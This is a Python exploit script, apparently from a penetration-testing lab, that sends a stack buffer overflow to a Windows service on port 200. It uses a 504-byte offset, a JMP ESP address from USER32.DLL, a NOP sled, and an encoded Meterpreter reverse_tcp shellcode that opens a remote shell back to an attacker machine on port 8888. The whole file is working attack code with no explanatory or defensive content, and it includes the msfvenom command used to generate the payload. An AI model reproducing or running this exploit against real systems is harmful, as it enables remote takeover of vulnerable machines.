from pwn import *
import socket
import struct

PORT = 200
HOST = "192.168.71.131"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# payload = cyclic(1000) 504
junk = b"A" * 504
# Address=7E4456F7 Message=  0x7e4456f7 : "\xff\xe4" |  {PAGE_EXECUTE_READ} [USER32.DLL] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.DLL)

eip = struct.pack("<I", 0x7e4456f7)
nop_sled = b"\x90" * 16
"""
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.71.129 LPORT=8888 -e x86/shikata_ga_nai -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of python file: 1865 bytes
"""
buf =  b""
buf += b"\xbd\xf5\xb0\x6a\x9c\xdb\xd4\xd9\x74\x24\xf4\x5a\x31"
buf += b"\xc9\xb1\x59\x31\x6a\x14\x03\x6a\x14\x83\xc2\x04\x17"
buf += b"\x45\x96\x74\x58\xa6\x67\x85\x06\x96\xb5\xe1\x4d\x8a"
buf += b"\x09\x63\xb4\xa0\x38\x7f\xbd\xe5\xa8\x70\x76\x43\xf7"
buf += b"\xbf\x87\xdf\x85\x97\x46\x20\xc5\xd4\xc9\xdc\x14\x09"
buf += b"\x29\xdc\xd6\x5c\x28\x19\xa1\x2b\xc5\xf7\x65\x5f\x4b"
buf += b"\xe8\x02\x1d\x57\x09\xc5\x29\xe7\x71\x60\xed\x93\xcd"
buf += b"\x6b\x3e\x0b\x45\x33\x9e\x20\x11\xdc\xdf\xe5\x27\x15"
buf += b"\xab\x35\x19\x59\x1d\xce\x6d\x2e\x9f\x06\xbc\xf0\x0c"
buf += b"\x67\x70\xfd\x4d\xa0\xb7\x1e\x38\xda\xcb\xa3\x3b\x19"
buf += b"\xb1\x7f\xc9\xbd\x11\x0b\x69\x19\xa3\xd8\xec\xea\xaf"
buf += b"\x95\x7b\xb4\xb3\x28\xaf\xcf\xc8\xa1\x4e\x1f\x59\xf1"
buf += b"\x74\xbb\x01\xa1\x15\x9a\xef\x04\x29\xfc\x48\xf8\x8f"
buf += b"\x77\x7a\xef\xb0\x78\x84\x10\xed\xee\x48\xdd\x0e\xee"
buf += b"\xc6\x56\x7c\xdc\x49\xcd\xea\x6c\x01\xcb\xed\xe5\x05"
buf += b"\xec\x22\x4d\x45\x12\xc3\xad\x4f\xd1\x97\xfd\xe7\xf0"
buf += b"\x97\x96\xf7\xfd\x4d\x02\xf2\x69\xae\x7a\x45\xeb\x46"
buf += b"\x78\x4a\xc9\x2e\xf5\xac\x5d\x1f\x55\x61\x1e\xcf\x15"
buf += b"\xd1\xf6\x05\x9a\x0e\xe6\x25\x71\x27\x8d\xc9\x2f\x1f"
buf += b"\x3a\x73\x6a\xeb\xdb\x7c\xa1\x91\xdc\xf7\x43\x65\x92"
buf += b"\xff\x26\x75\xc3\x67\xc8\x85\x14\x02\xc8\xef\x10\x84"
buf += b"\x9f\x87\x1a\xf1\xd7\x07\xe4\xd4\x64\x4f\x1a\xa9\x5c"
buf += b"\x3b\x2d\x3f\xe0\x53\x52\xaf\xe0\xa3\x04\xa5\xe0\xcb"
buf += b"\xf0\x9d\xb3\xee\xfe\x0b\xa0\xa2\x6a\xb4\x90\x17\x3c"
buf += b"\xdc\x1e\x41\x0a\x43\xe1\xa4\x08\x84\x1d\x3a\x27\x2d"
buf += b"\x75\xc4\x77\xcd\x85\xae\x77\x9d\xed\x25\x57\x12\xdd"
buf += b"\xc6\x72\x7b\x75\x4c\x13\xc9\xe4\x51\x3e\x8f\xb8\x52"
buf += b"\xcd\x14\x4b\x28\xbe\xab\xac\xcd\xd6\xcf\xad\xcd\xd6"
buf += b"\xf1\x92\x1b\xef\x87\xd5\x9f\x54\x97\x60\xbd\xfd\x32"
buf += b"\x8a\x91\xfe\x16"
shellcode = buf
payload = junk + eip + nop_sled + shellcode

s.send(payload)
s.close()
